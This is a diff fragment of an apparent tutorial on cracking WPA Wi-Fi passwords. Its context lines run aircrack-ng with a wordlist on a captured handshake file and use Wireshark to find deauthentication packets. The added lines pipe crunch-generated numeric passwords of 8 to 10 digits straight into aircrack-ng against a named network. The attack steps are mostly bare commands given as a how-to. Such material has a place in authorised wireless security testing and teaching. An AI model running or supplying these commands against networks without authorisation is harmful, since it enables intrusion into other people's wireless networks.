@@ -40,5 +40,9 @@ Step 9 :->  aircrack-ng -w (path of the wordlist) filename(wpa.cap as it was def
 Step 10 :->  wireshark filename.cap (now scrool down till you find the deauthentication packets in the 
 info tab)
 
-
 ### NOW WAIT FOR THE AIRCRACK-NG TO CRACK THE PASSWORD FROM THE GIVEN WORDLIST.
+
+# WE CAN ALSO USE CRUNCH TO CRACK THE PASSWORD FROM CAPTURED HASH FILE USING PIPELINING SO WE DON'T HAVE TO SAVE THOUSANDS OF PASSWORDS FILE ON THE SYSTEM.
+
+## Step 1 :->  crunch 8 10 0123456789 | aircrack-ng -w - filename.cap -e wifiname 
+(8 10 = is the paswword length that it will start from 8 letters and test all the way till 10 letters)
